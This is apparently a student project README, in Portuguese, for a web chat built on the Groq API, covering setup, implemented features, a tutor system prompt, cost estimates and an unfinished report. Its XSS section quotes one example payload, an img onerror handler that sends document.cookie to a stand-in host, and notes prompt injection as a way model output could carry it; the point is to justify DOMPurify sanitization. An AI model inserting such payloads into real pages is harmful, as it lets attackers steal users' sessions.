# Chat de IA com a API da Groq

Chat web que consome um modelo de ~100B parâmetros (GPT-OSS 120B) pela API da Groq. Atividade da Aula 4 — TEC13 Engenharia de IA Aplicada, IFBA Campus Irecê.

> **Nota:** os modelos Llama (`llama-3.3-70b-versatile` e `llama-3.1-8b-instant`) retornam `404 model_not_found` na Groq hoje (descontinuados). Trocamos por `openai/gpt-oss-120b` e `openai/gpt-oss-20b`. A troca é feita no objeto `MODELOS` de `index.js`.

**Dupla:** NOME COMPLETO 1, NOME COMPLETO 2 <!-- TODO: preencher -->

## Tecnologias

Node.js, Express, groq-sdk, dotenv, HTML/CSS/JS puro (marked + DOMPurify via CDN).

## Como rodar

1. Clone o repositório e instale as dependências:
   ```
   npm install
   ```
2. Copie `.env.example` para `.env` e preencha sua chave da Groq (gerada em console.groq.com):
   ```
   GROQ_API_KEY=sua_chave_aqui
   ```
3. Suba o servidor:
   ```
   npm start
   ```
4. Acesse http://localhost:3000

## Desafios implementados

- **Desafio 1 — Memória de conversa:** `index.js` mantém o histórico no servidor (`sessoes`) e o reenvia a cada chamada, limitado a 10 trocas (`slice(-MAX_TROCAS * 2)`).
- **Desafio 2 — Indicador de carregamento:** `public/js/main.js` mostra a bolha "Pensando...", remove ao receber a resposta e desabilita botão e campo durante a espera.
- **Desafio 3 — Assistente especializado:** `SYSTEM_PROMPT` em `index.js` (detalhes abaixo).
- **Desafio 4 — Seletor de modelos:** `<select id="modelo">` no `index.html`; o servidor valida o modelo contra uma lista permitida (`MODELOS`).
- **Desafio 5 — Painel de tokens e custo:** o servidor devolve `usage`, tempo e custo; o front exibe por mensagem, acumulado da sessão e projeção de 1.000 conversas.
- **Desafio 6 — Erros específicos:** `catch` em `index.js` trata 400, 401, 413 e 429 com mensagem própria. Teste com chave errada: `npm run test:erro`.
- **Desafio 8 — Sessões isoladas:** `sessionId` (UUID) gerado no navegador (`sessionStorage`, por aba) e `Map` no servidor.
- **Desafio 9 — Proteção contra XSS:** `DOMPurify.sanitize(marked.parse(...))` antes do `innerHTML`.

### Desafio 3 — prompts

**Antigo (do vídeo):** "Não responda nada fora do contexto de ciência da computação e programação."

**Novo:** "Você é o 'Monitor de Algoritmos', um tutor de Algoritmos e Estrutura de Dados do curso de ADS do IFBA Campus Irecê. Responda sempre em português do Brasil, de forma didática e curta, com exemplos de código quando ajudar. Se a pergunta não for sobre computação ou programação, recuse educadamente e convide o aluno a perguntar algo da área."

**Três exemplos de mudança de comportamento:** <!-- TODO: rodar e transcrever -->
1. "Explique o que é uma pilha." → antes: ...; depois: ...
2. "Qual a receita de bolo de cenoura?" → antes: ...; depois: recusa educada.
3. "Quem ganhou a Copa de 2002?" → antes: ...; depois: recusa educada.

### Desafio 4 — comparação 120B vs 20B

<!-- TODO: fazer a mesma pergunta nos dois modelos pela interface e registrar qualidade e tempo (o painel mostra os ms). Referência: 120B respondeu uma pergunta curta em ~870 ms -->

### Desafio 5 — projeção de custo

Preços usados (US$ por 1M de tokens): 120B = 0,15 entrada / 0,60 saída; 20B = 0,075 / 0,30. Medição real: uma pergunta curta no 120B gastou 334 tokens, ≈ US$ 0,00012, ou seja ≈ US$ 0,12 para 1.000 conversas desse tamanho. O painel calcula o custo real por mensagem e projeta 1.000 conversas multiplicando o custo da sessão por 1.000.

### Desafio 9 — o risco de XSS

O `marked` converte Markdown em HTML, e a resposta do modelo é texto externo, que pode ser influenciado por quem conversa (prompt injection) ou por conteúdo que o modelo reproduz. Sem sanitização, uma resposta como `<img src=x onerror="fetch('https://evil/?c='+document.cookie)">` seria inserida via `innerHTML` e executaria JavaScript no navegador do usuário, roubando dados da sessão. O DOMPurify remove tags e atributos perigosos antes da inserção.

## Arquitetura

A chamada à Groq acontece no servidor porque a chave de API é uma credencial: tudo que roda no navegador é visível a qualquer pessoa (DevTools, aba Network, código-fonte). O navegador só conversa com `/api/chat` (caminho relativo); o Express guarda a chave no `.env` (ignorado pelo Git), valida a entrada, chama a Groq e devolve só a resposta.

## Relatório

<!-- TODO: as respostas 2, 3 e 4 dependem de testes reais com a chave da Groq. Substituir os trechos marcados. -->

**1. Por que a chamada à Groq tem de ser no servidor?**
Qualquer código em `main.js` é público: basta abrir o DevTools para ver a chave no código ou na aba Network. Um usuário mal-intencionado copiaria a chave e a usaria em scripts próprios, gastando nossa cota e dinheiro, esgotando o limite de requisições (derrubando o chat para todos) e usando o modelo para qualquer fim em nosso nome. Como a chave não tem escopo por origem, só revogá-la resolveria. No servidor, a chave nunca sai do `.env`, e ainda podemos validar entrada, limitar tamanho e tratar erros antes de gastar tokens.

**2. Erro que mais tempo levou para resolver** <!-- TODO: preencher com o erro real da dupla (mensagem, causa, como descobriram) -->

**3. O que acontece ao mudar o system prompt?** <!-- TODO: perguntar algo fora de computação (ex.: receita de bolo) com o prompt original do vídeo e depois com um prompt sem restrição (ex.: "Você é um assistente útil."); transcrever as duas respostas -->

**4. O modelo inventou alguma informação?** <!-- TODO: transcrever trecho, ou descrever cenário. Dica de cenário: pedir referências bibliográficas ou a assinatura de uma função de biblioteca pouco conhecida -->

**5. Colocariam no site do IFBA Irecê hoje?**
Ainda não. Custo: é baixo por conversa (centavos de dólar para centenas de mensagens), mas sem limite por usuário qualquer pessoa pode gerar gasto. Risco de resposta errada: o modelo pode inventar (alucinar) informações institucionais, como datas e regras, e o chat ainda não responde com base em documentos reais do campus. Segurança: a chave está protegida, mas faltam rate limit por IP, autenticação e logs. O que falta: RAG com os documentos do campus, limites de uso, histórico persistente (hoje some ao reiniciar o servidor), deploy com HTTPS e um aviso claro de que as respostas podem conter erros.
